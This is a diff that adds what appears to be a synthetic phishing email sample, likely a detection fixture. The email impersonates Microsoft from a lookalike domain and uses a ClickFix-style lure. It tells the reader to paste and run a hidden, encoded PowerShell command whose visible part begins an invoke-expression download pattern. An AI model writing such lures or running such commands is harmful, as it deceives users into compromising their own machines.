@@ -1,0 +1,19 @@
+Received: from MX.corp.example.com (10.20.30.9) by inbox.corp.example.com (10.20.30.11); Tue, 3 Nov 2026 14:00:10 +0000
+Authentication-Results: mx.corp.example.com; spf=fail smtp.mailfrom=rnicrosoft-verify.com; dkim=none; dmarc=fail header.from=rnicrosoft-verify.com
+From: "Microsoft Account Team" <no-reply@rnicrosoft-verify.com>
+To: <staff@corp.example.com>
+Subject: Action required: verify you are human to restore mailbox access
+Date: Tue, 3 Nov 2026 14:00:00 +0000
+Message-ID: <synthetic-clickfix-002@rnicrosoft-verify.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+
+Your mailbox is full and your account will be suspended.
+
+To verify you are human, complete these steps:
+  1. Press Windows + R
+  2. Press Ctrl + V to paste the verification code
+  3. Press Enter
+
+Verification code (already copied to your clipboard):
+powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA
